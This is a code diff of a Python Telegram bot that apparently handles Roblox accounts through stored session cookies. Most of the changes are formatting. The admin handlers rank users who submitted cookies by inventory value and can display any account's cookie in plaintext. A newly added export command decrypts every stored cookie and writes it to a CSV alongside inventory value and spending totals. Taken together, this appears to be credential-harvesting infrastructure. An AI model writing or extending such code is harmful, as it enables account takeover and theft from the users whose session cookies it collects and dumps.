     kb_rows.append([InlineKeyboardButton(text='◀️ Назад', callback_data='admin:menu')])
     kb = InlineKeyboardMarkup(inline_keyboard=kb_rows)
 
-    text = f"👥 Пользователи с куками (топ по инвентарю)\nВсего: {total}\nСтр: {page+1}"
+    text = f"👥 Пользователи с куками (топ по инвентарю)\nВсего: {total}\nСтр: {page + 1}"
     try:
         await cb.message.edit_text(text, reply_markup=kb)
     except Exception:
         await cb.message.answer(text, reply_markup=kb)
+
+
 def kb_admin_main():
     rows = [
         [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin:broadcast")],
@@ -3030,7 +3121,10 @@ def kb_admin_main():
         [InlineKeyboardButton(text="📊 Статистика", callback_data="admin:stats")],
     ]
     return InlineKeyboardMarkup(inline_keyboard=rows)
+
+
 from aiogram.filters import Command
+
 
 @router.message(Command("admin"))
 async def cmd_admin(msg: types.Message):
@@ -3042,6 +3136,7 @@ async def cmd_admin(msg: types.Message):
     # если админ — открыть панель
     await msg.answer("🛠 Панель администратора", reply_markup=kb_admin_main())
 
+
 @router.callback_query(F.data == "admin:menu")
 async def cb_admin_menu(call: types.CallbackQuery):
     await protect_language(call.from_user.id)
@@ -3050,7 +3145,6 @@ async def cb_admin_menu(call: types.CallbackQuery):
                            reply_markup=await kb_main_i18n(call.from_user.id))
         return
     await edit_or_send(call.message, "🛠 Панель администратора", reply_markup=kb_admin_main())
-
 
 
 @router.callback_query(F.data.regexp(r'^admin:user:(\d+)$'))
@@ -3105,7 +3199,6 @@ async def _admin_user_view(cb: types.CallbackQuery, state: FSMContext):
         await cb.message.answer(text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=True)
 
 
-
 @router.callback_query(F.data.regexp(r'^admin:cookie:req:(\d+)$'))
 async def _admin_cookie_confirm(cb: types.CallbackQuery, state: FSMContext):
     if not is_admin(cb.from_user.id):
@@ -3117,6 +3210,7 @@ async def _admin_cookie_confirm(cb: types.CallbackQuery, state: FSMContext):
     ])
     await cb.answer()
     await cb.message.answer(f"⚠️ Показать cookie для RID <code>{rid}</code>?", parse_mode="HTML", reply_markup=kb)
+
 
 @router.callback_query(F.data.regexp(r'^admin:cookie:show:(\d+)$'))
 async def _admin_cookie_show(cb: types.CallbackQuery, state: FSMContext):
@@ -3141,9 +3235,8 @@ async def _admin_cookie_show(cb: types.CallbackQuery, state: FSMContext):
         bio.name = f"cookie_{rid}.txt"
         await cb.message.answer_document(document=bio, caption=f"🍪 Cookie для RID {rid}")
     else:
-        await cb.message.answer(f"🍪 Cookie для <code>{rid}</code>:\n<code>{html.escape(cookie)}</code>", parse_mode="HTML")
-
-
+        await cb.message.answer(f"🍪 Cookie для <code>{rid}</code>:\n<code>{html.escape(cookie)}</code>",
+                                parse_mode="HTML")
 
 
 # ===== BROADCAST =====
@@ -3153,10 +3246,12 @@ BROADCAST_BATCH = int(os.getenv("BROADCAST_BATCH", "20"))
 BROADCAST_DELAY = float(os.getenv("BROADCAST_DELAY", "0.25"))
 BROADCAST_CONCURRENCY = int(os.getenv("BROADCAST_CONCURRENCY", "6"))
 
+
 @router.callback_query(F.data == "admin:broadcast")
 async def admin_broadcast(cb: types.CallbackQuery, state: FSMContext):
     if not is_admin(cb.from_user.id):
-        await cb.answer(); return
+        await cb.answer();
+        return
     await state.set_state("broadcast.collect")
     await cb.message.edit_text(
         "📢 Режим рассылки включён.\n"
@@ -3169,6 +3264,7 @@ async def admin_broadcast(cb: types.CallbackQuery, state: FSMContext):
         ])
     )
 
+
 @router.message(StateFilter("broadcast.collect"))
 async def bc_collect(message: types.Message, state: FSMContext):
     if not is_admin(message.from_user.id):
@@ -3179,21 +3275,26 @@ async def bc_collect(message: types.Message, state: FSMContext):
     await state.update_data(buf=buf)
     await message.answer(f"✅ Добавлено. В буфере: {len(buf)}. Нажми «Предпросмотр».")
 
+
 @router.callback_query(F.data == "admin:bc_cancel")
 async def bc_cancel(cb: types.CallbackQuery, state: FSMContext):
     if not is_admin(cb.from_user.id):
-        await cb.answer(); return
+        await cb.answer();
+        return
     await state.clear()
     await cb.message.edit_text("❌ Рассылка отменена.", reply_markup=kb_admin_main())
+
 
 @router.callback_query(F.data == "admin:bc_preview")
 async def bc_preview(cb: types.CallbackQuery, state: FSMContext):
     if not is_admin(cb.from_user.id):
-        await cb.answer(); return
+        await cb.answer();
+        return
     data = await state.get_data()
     buf = data.get("buf") or []
     if not buf:
-        await cb.answer("Буфер пуст.", show_alert=True); return
+        await cb.answer("Буфер пуст.", show_alert=True);
+        return
     await cb.message.answer(f"👀 Предпросмотр ({len(buf)}):")
     for ref in buf:
         try:
@@ -3208,6 +3309,7 @@ async def bc_preview(cb: types.CallbackQuery, state: FSMContext):
         [InlineKeyboardButton(text="❌ Отмена", callback_data="admin:bc_cancel")],
     ])
     await cb.message.answer("Готово к отправке. Подтверждаешь?", reply_markup=kb)
+
 
 async def _iter_all_user_ids():
     # пробуем несколько вариантов API хранилища, чтобы работать с твоей БД
@@ -3247,22 +3349,27 @@ async def _iter_all_user_ids():
         pass
     return []
 
+
 @router.callback_query(F.data == "admin:bc_confirm")
 async def bc_confirm(cb: types.CallbackQuery, state: FSMContext):
     if not is_admin(cb.from_user.id):
-        await cb.answer(); return
+        await cb.answer();
+        return
     data = await state.get_data()
     buf = data.get("buf") or []
     await state.clear()
     if not buf:
-        await cb.answer("Буфер пуст.", show_alert=True); return
+        await cb.answer("Буфер пуст.", show_alert=True);
+        return
 
     users = await _iter_all_user_ids()
     if not users:
-        await cb.message.edit_text("⚠️ Нет пользователей для рассылки.", reply_markup=kb_admin_main()); return
+        await cb.message.edit_text("⚠️ Нет пользователей для рассылки.", reply_markup=kb_admin_main());
+        return
 
     sem = asyncio.Semaphore(BROADCAST_CONCURRENCY)
-    sent = 0; failed = 0
+    sent = 0;
+    failed = 0
 
     async def send_one(uid: int):
         nonlocal sent, failed
@@ -3279,7 +3386,7 @@ async def bc_confirm(cb: types.CallbackQuery, state: FSMContext):
                 logger.warning(f"broadcast to {uid} failed: {e}")
 
     for i in range(0, len(users), BROADCAST_BATCH):
-        chunk = users[i:i+BROADCAST_BATCH]
+        chunk = users[i:i + BROADCAST_BATCH]
         await asyncio.gather(*(send_one(u) for u in chunk), return_exceptions=True)
         if i + BROADCAST_BATCH < len(users):
             await asyncio.sleep(BROADCAST_DELAY)
@@ -3290,16 +3397,18 @@ async def bc_confirm(cb: types.CallbackQuery, state: FSMContext):
 # ======================= SPENDING (categories, paginated, i18n) =======================
 import math, html, asyncio, time
 
-_SP_PAGE_PLACES = 6        # categories (places) per page
-_SP_PAGE_ITEMS  = 20       # items per page
-_SP_MEM_TTL     = 10 * 60  # seconds
+_SP_PAGE_PLACES = 6  # categories (places) per page
+_SP_PAGE_ITEMS = 20  # items per page
+_SP_MEM_TTL = 10 * 60  # seconds
 
 # key=(tg_id,rid) -> {'ts': time, 'places': [(name,cnt,sum)], 'items': [list[tx]]}
 _SP_MEM: dict[tuple[int, int], dict] = {}
 
+
 def _sp_trim(s: str, n: int = 40) -> str:
     s = (s or '').strip()
     return s if len(s) <= n else s[: n - 1] + T('common.ellipsis')
+
 
 def _sp_price(tx: dict) -> int:
     v = tx.get('raw_amount')
@@ -3308,11 +3417,14 @@ def _sp_price(tx: dict) -> int:
     except Exception:
         return 0
 
+
 def _sp_place_of(tx: dict) -> str:
     return (tx.get('place') or tx.get('creator') or tx.get('source') or tx.get('seller') or T('common.unknown'))
 
+
 def _sp_total(rows: list[dict]) -> int:
     return sum(_sp_price(x) for x in rows or [])
+
 
 def _sp_group(rows: list[dict]):
     bucket = {}
@@ -3330,6 +3442,7 @@ def _sp_group(rows: list[dict]):
     grand = _sp_total(rows)
     return places, items_by_place, grand
 
+
 def _sp_kb_places(rid: int, places, page: int):
     total_pages = max(1, math.ceil(len(places) / _SP_PAGE_PLACES))
     page = max(0, min(page, total_pages - 1))
@@ -3343,30 +3456,34 @@ def _sp_kb_places(rid: int, places, page: int):
 
     nav = []
     if page > 0:
-        nav.append(InlineKeyboardButton(text='◀️', callback_data=f's:p:{rid}:{page-1}'))
-    nav.append(InlineKeyboardButton(text=T('inventory_view.page', current=page+1, total=total_pages), callback_data='noop'))
+        nav.append(InlineKeyboardButton(text='◀️', callback_data=f's:p:{rid}:{page - 1}'))
+    nav.append(
+        InlineKeyboardButton(text=T('inventory_view.page', current=page + 1, total=total_pages), callback_data='noop'))
     if page + 1 < total_pages:
-        nav.append(InlineKeyboardButton(text='▶️', callback_data=f's:p:{rid}:{page+1}'))
+        nav.append(InlineKeyboardButton(text='▶️', callback_data=f's:p:{rid}:{page + 1}'))
     if nav:
         rows.append(nav)
 
-    rows.append([InlineKeyboardButton(text=T('buttons.refresh'),        callback_data=f"s:r:{rid}")])
+    rows.append([InlineKeyboardButton(text=T('buttons.refresh'), callback_data=f"s:r:{rid}")])
     rows.append([InlineKeyboardButton(text=T('buttons.back_to_profile'), callback_data=f"acct:{rid}")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
+
 
 def _sp_kb_items(rid: int, idx: int, page: int, total_pages: int):
     rows = []
     nav = []
     if page > 0:
-        nav.append(InlineKeyboardButton(text='◀️', callback_data=f's:o:{rid}:{idx}:{page-1}'))
-    nav.append(InlineKeyboardButton(text=T('inventory_view.page', current=page+1, total=total_pages), callback_data='noop'))
+        nav.append(InlineKeyboardButton(text='◀️', callback_data=f's:o:{rid}:{idx}:{page - 1}'))
+    nav.append(
+        InlineKeyboardButton(text=T('inventory_view.page', current=page + 1, total=total_pages), callback_data='noop'))
     if page + 1 < total_pages:
-        nav.append(InlineKeyboardButton(text='▶️', callback_data=f's:o:{rid}:{idx}:{page+1}'))
+        nav.append(InlineKeyboardButton(text='▶️', callback_data=f's:o:{rid}:{idx}:{page + 1}'))
     if nav:
         rows.append(nav)
-    rows.append([InlineKeyboardButton(text=T('nav.spending'),           callback_data=f's:p:{rid}:0')])
+    rows.append([InlineKeyboardButton(text=T('nav.spending'), callback_data=f's:p:{rid}:0')])
     rows.append([InlineKeyboardButton(text=T('buttons.back_to_profile'), callback_data=f'acct:{rid}')])
     return InlineKeyboardMarkup(inline_keyboard=rows)
+
 
 def _sp_mem_get(tg_id: int, rid: int):
     rec = _SP_MEM.get((tg_id, rid))
@@ -3375,6 +3492,7 @@ def _sp_mem_get(tg_id: int, rid: int):
         _SP_MEM.pop((tg_id, rid), None)
         return None
     return rec
+
 
 def _sp_mem_set(tg_id: int, rid: int, places, items_by_place, total_sum: int | None = None):
     # Backward-compatible: if total_sum isn't provided, compute from places [(name, cnt, ssum), ...]
@@ -3390,6 +3508,7 @@ def _sp_mem_set(tg_id: int, rid: int, places, items_by_place, total_sum: int | N
         'total_sum': total_sum,
     }
 
+
 async def _sp_fetch_rows(tg_id: int, rid: int, limit: int = 500):
     enc = await storage.get_encrypted_cookie(tg_id, rid)
     if not enc:
@@ -3397,6 +3516,7 @@ async def _sp_fetch_rows(tg_id: int, rid: int, limit: int = 500):
     from roblox_client import get_spending_history_by_encrypted_cookie
     rows = await get_spending_history_by_encrypted_cookie(enc, rid, limit=limit, use_cache=False)
     return rows or []
+
 
 def _sp_render_items(arr, page: int):
     total_pages = max(1, math.ceil(len(arr) / _SP_PAGE_ITEMS))
@@ -3415,11 +3535,14 @@ def _sp_render_items(arr, page: int):
     title = T('spending.title', total=len(arr))
     return f"{title}\n\n{body}", total_pages
 
+
 @router.callback_query(F.data.startswith('spend:'))
 async def cb_spend_entry(call: types.CallbackQuery):
     await protect_language(call.from_user.id)
-    try: await call.answer(cache_time=1)
-    except: pass
+    try:
+        await call.answer(cache_time=1)
+    except:
+        pass
 
     tg = call.from_user.id
     rid = int(call.data.split(':', 1)[1])
@@ -3437,14 +3560,19 @@ async def cb_spend_entry(call: types.CallbackQuery):
         header = T('spending.header', sum=rec.get('total_sum', 0))
         await wait.edit_text(header, reply_markup=kb)
     except Exception as e:
-        try:    await wait.edit_text(T('errors.generic', err=str(e)))
-        except: await call.message.answer(T('errors.generic', err=str(e)))
+        try:
+            await wait.edit_text(T('errors.generic', err=str(e)))
+        except:
+            await call.message.answer(T('errors.generic', err=str(e)))
+
 
 @router.callback_query(F.data.startswith('s:r:'))
 async def cb_spend_refresh(call: types.CallbackQuery):
     await protect_language(call.from_user.id)
-    try: await call.answer()
-    except: pass
+    try:
+        await call.answer()
+    except:
+        pass
 
     rid = int(call.data.split(':')[-1])
     tg = call.from_user.id
@@ -3456,14 +3584,19 @@ async def cb_spend_refresh(call: types.CallbackQuery):
 
     kb = _sp_kb_places(rid, places, 0)
     header = T('spending.header', sum=grand)
-    try:    await wait.edit_text(header, reply_markup=kb)
-    except: await call.message.answer(header, reply_markup=kb)
+    try:
+        await wait.edit_text(header, reply_markup=kb)
+    except:
+        await call.message.answer(header, reply_markup=kb)
+
 
 @router.callback_query(F.data.startswith('s:p:'))
 async def cb_spend_page(call: types.CallbackQuery):
     await protect_language(call.from_user.id)
-    try: await call.answer()
-    except: pass
+    try:
+        await call.answer()
+    except:
+        pass
 
     _, _, rid, page = call.data.split(':', 3)
     rid, page = int(rid), max(0, int(page))
@@ -3473,14 +3606,19 @@ async def cb_spend_page(call: types.CallbackQuery):
 
     kb = _sp_kb_places(rid, rec['places'], page)
     header = T('spending.header', sum=rec.get('total_sum', 0))
-    try:    await call.message.edit_text(header, reply_markup=kb)
-    except: await call.message.answer(header, reply_markup=kb)
+    try:
+        await call.message.edit_text(header, reply_markup=kb)
+    except:
+        await call.message.answer(header, reply_markup=kb)
+
 
 @router.callback_query(F.data.startswith('s:o:'))
 async def cb_spend_open(call: types.CallbackQuery):
     await protect_language(call.from_user.id)
-    try: await call.answer()
-    except: pass
+    try:
+        await call.answer()
+    except:
+        pass
 
     _, _, rid, idx, page = call.data.split(':', 4)
     rid, idx, page = int(rid), int(idx), max(0, int(page))
@@ -3491,10 +3629,13 @@ async def cb_spend_open(call: types.CallbackQuery):
     items = rec['items'][idx] if 0 <= idx < len(rec['items']) else []
     text, total_pages = _sp_render_items(items, page)
     kb = _sp_kb_items(rid, idx, page, total_pages)
-    try:    await call.message.edit_text(text, reply_markup=kb, parse_mode='HTML', disable_web_page_preview=True)
-    except: await call.message.answer(text, reply_markup=kb, parse_mode='HTML', disable_web_page_preview=True)
-# ======================= /SPENDING =======================
+    try:
+        await call.message.edit_text(text, reply_markup=kb, parse_mode='HTML', disable_web_page_preview=True)
+    except:
+        await call.message.answer(text, reply_markup=kb, parse_mode='HTML', disable_web_page_preview=True)
 
+
+# ======================= /SPENDING =======================
 
 
 @router.callback_query(F.data.regexp(r'^pub_spend:(\d+)$'))
@@ -3511,9 +3652,9 @@ async def cb_public_spending_locked(call: types.CallbackQuery) -> None:
     await edit_or_send(call.message, L('public.spending_login_required'))
 
 
-
 # ======================= FAVORITES (15 per page) =======================
 _FAV_PAGE_SIZE = 15
+
 
 async def _fetch_favorites(tg_id: int, rid: int):
     # Try cookie (if bound), but favorites are usually public
@@ -3539,11 +3680,12 @@ async def _fetch_favorites(tg_id: int, rid: int):
     except Exception:
         return []
 
+
 def _fav_page_lines(items, page: int):
     total = max(1, (len(items) + _FAV_PAGE_SIZE - 1) // _FAV_PAGE_SIZE)
     page = max(0, min(page, total - 1))
     start = page * _FAV_PAGE_SIZE
-    chunk = items[start:start+_FAV_PAGE_SIZE]
+    chunk = items[start:start + _FAV_PAGE_SIZE]
     lines = []
     for it in chunk:
         nm = html.escape(it.get("name") or "—")
@@ -3556,19 +3698,22 @@ def _fav_page_lines(items, page: int):
     title = L('games.fav_title')
     return f"{title}\n\n{body}", total
 
+
 def _fav_kb(rid: int, page: int, total: int):
     from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
     nav = []
     rows = []
     if page > 0:
-        nav.append(InlineKeyboardButton(text=L('games.prev'), callback_data=f'fav:{rid}:{page-1}'))
-    nav.append(InlineKeyboardButton(text=L('games.page', cur=page+1, total=total), callback_data='noop'))
+        nav.append(InlineKeyboardButton(text=L('games.prev'), callback_data=f'fav:{rid}:{page - 1}'))
+    nav.append(InlineKeyboardButton(text=L('games.page', cur=page + 1, total=total), callback_data='noop'))
     if page + 1 < total:
-        nav.append(InlineKeyboardButton(text=L('games.next'), callback_data=f'fav:{rid}:{page+1}'))
+        nav.append(InlineKeyboardButton(text=L('games.next'), callback_data=f'fav:{rid}:{page + 1}'))
     if nav:
         rows.append(nav)
     rows.append([InlineKeyboardButton(text=L('buttons.back_to_profile'), callback_data=f'acct:{rid}')])
     return InlineKeyboardMarkup(inline_keyboard=rows)
+
+
 # ======================= /FAVORITES =======================
 # ======================= GAME STATS (history/favorites/analysis) =======================
 def _fmt_date(d: str) -> str:
@@ -3577,11 +3722,14 @@ def _fmt_date(d: str) -> str:
     except Exception:
         return d or ''
 
+
 def _games_summary_text(analysis: dict) -> str:
     try:
         lines = []
         lines.append(T('games.header'))
-        lines.append(T('games.totals', total=analysis.get('total_games_played', 0), unique=analysis.get('unique_games_count', 0), favs=analysis.get('favorite_games_count', 0)))
+        lines.append(
+            T('games.totals', total=analysis.get('total_games_played', 0), unique=analysis.get('unique_games_count', 0),
+              favs=analysis.get('favorite_games_count', 0)))
         top = analysis.get('most_played_games') or []
         if top:
             lines.append('')
@@ -3609,19 +3757,23 @@ def _games_summary_text(analysis: dict) -> str:
     except Exception as e:
         return f"📊 Games: {e}"
 
+
 def _kb_games(rid: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=T('buttons.refresh'), callback_data=f'games_refresh:{rid}')],
         [InlineKeyboardButton(text=T('buttons.back_to_profile'), callback_data=f'acct:{rid}')],
     ])
 
+
 @router.callback_query(F.data.startswith('games:'))
 async def redirected_games(call: types.CallbackQuery) -> None:
     await protect_language(call.from_user.id)
-    try: await call.answer(cache_time=1)
-    except: pass
     try:
-        rid = int(call.data.split(':',1)[1])
+        await call.answer(cache_time=1)
+    except:
+        pass
+    try:
+        rid = int(call.data.split(':', 1)[1])
     except Exception:
         rid = 0
     # show favorites page 0
@@ -3632,14 +3784,17 @@ async def redirected_games(call: types.CallbackQuery) -> None:
         await edit_or_send(call.message, text, reply_markup=kb, disable_web_page_preview=True)
     except Exception:
         await call.message.answer(text, reply_markup=kb, disable_web_page_preview=True)
+
 
 @router.callback_query(F.data.startswith('games_refresh:'))
 async def redirected_games_refresh(call: types.CallbackQuery) -> None:
     await protect_language(call.from_user.id)
-    try: await call.answer(cache_time=1)
-    except: pass
     try:
-        rid = int(call.data.split(':',1)[1])
+        await call.answer(cache_time=1)
+    except:
+        pass
+    try:
+        rid = int(call.data.split(':', 1)[1])
     except Exception:
         rid = 0
     # show favorites page 0
@@ -3651,20 +3806,24 @@ async def redirected_games_refresh(call: types.CallbackQuery) -> None:
     except Exception:
         await call.message.answer(text, reply_markup=kb, disable_web_page_preview=True)
 
+
 @router.callback_query(F.data.startswith('fav:'))
 async def cb_favorites(call: types.CallbackQuery) -> None:
     await protect_language(call.from_user.id)
-    try: await call.answer(cache_time=1)
-    except: pass
+    try:
+        await call.answer(cache_time=1)
+    except:
+        pass
     try:
         _, rid, page = call.data.split(':', 2)
     except ValueError:
         parts = call.data.split(':')
         rid = parts[1] if len(parts) > 1 else "0"
         page = "0"
-    rid = int(rid); page = max(0, int(page or 0))
+    rid = int(rid);
+    page = max(0, int(page or 0))
 
-    wait = await call.message.answer(L('games.loading') if LL('games.loading','') else L('common.ellipsis'))
+    wait = await call.message.answer(L('games.loading') if LL('games.loading', '') else L('common.ellipsis'))
     try:
         items = await _fetch_favorites(call.from_user.id, rid)
         text, total = _fav_page_lines(items, page)
@@ -3675,6 +3834,96 @@ async def cb_favorites(call: types.CallbackQuery) -> None:
             await call.message.answer(text, reply_markup=kb, disable_web_page_preview=True)
     except Exception as e:
         err = L('errors.generic', err=str(e))
-        try: await wait.edit_text(err)
-        except: await call.message.answer(err)
+        try:
+            await wait.edit_text(err)
+        except:
+            await call.message.answer(err)
 # ======================= /FAVORITES =======================
+# вставь в handlers.py
+from aiogram.filters import Command
+import io, csv
+
+@router.message(Command("export_accounts_csv"))
+async def cmd_export_accounts_csv(msg: types.Message):
+    """Admin only: export accounts to CSV (nick,id,cookie,inventory_price,spending_total)."""
+    uid = msg.from_user.id
+    if not is_admin(uid):
+        await msg.reply("🚫 доступ запрещён")
+        return
+
+    await msg.reply("🔎 Формирую CSV...")
+
+    try:
+        accounts = await storage.list_accounts_distinct()
+    except Exception as e:
+        await msg.reply(f"❌ Ошибка при чтении аккаунтов: {e}")
+        return
+
+    if not accounts:
+        await msg.reply("⚠️ Аккаунтов не найдено.")
+        return
+
+    # CSV в память
+    buf = io.StringIO(newline="")
+    writer = csv.writer(buf, quoting=csv.QUOTE_MINIMAL)
+    # header
+    writer.writerow(["nick", "id", "cookie", "inventory_price", "spending_total"])
+
+    import roblox_client as rbc
+    from util.crypto import decrypt_text
+
+    SPENDING_LIMIT = 500  # <-- лимит транзакций для подсчёта
+
+    for acc in accounts:
+        try:
+            rid = int(acc.get("roblox_id") or 0)
+            nick = (acc.get("username") or "").replace("\r", " ").replace("\n", " ").strip()
+            inv_val = int(acc.get("inventory_val") or 0)
+        except Exception:
+            # пропускаем мусорные записи
+            continue
+
+        # попытка достать любую зашифрованную куку
+        enc = None
+        try:
+            enc = await storage.get_any_encrypted_cookie_by_roblox_id(rid)
+        except Exception:
+            enc = None
+
+        cookie_plain = ""
+        if enc:
+            try:
+                cookie_plain = decrypt_text(enc) or ""
+            except Exception:
+                cookie_plain = "<decrypt_error>"
+
+        # подсчёт трат — best-effort, лимит указан выше
+        spending_total = ""
+        if enc:
+            try:
+                txs = await rbc.get_spending_history_by_encrypted_cookie(enc, rid, limit=SPENDING_LIMIT, use_cache=False)
+                total = 0
+                for tx in (txs or []):
+                    try:
+                        # поле может называться по-разному; берём 'raw_amount' или 'amount'
+                        val = tx.get("raw_amount") if isinstance(tx, dict) else None
+                        if val is None:
+                            val = tx.get("amount") if isinstance(tx, dict) else None
+                        if val is None:
+                            continue
+                        total += int(val or 0)
+                    except Exception:
+                        continue
+                spending_total = str(total)
+            except Exception:
+                spending_total = "<error>"
+
+        writer.writerow([nick, rid, cookie_plain, inv_val, spending_total])
+
+    data = buf.getvalue()
+    buf.close()
+
+    payload = data.encode("utf-8")  # можно "utf-8-sig", если хочешь, чтобы Excel открыл без кракозябр
+    doc = BufferedInputFile(payload, filename="accounts_export.csv")
+
+    await msg.answer_document(document=doc, caption="✅ Экспорт аккаунтов (CSV)")
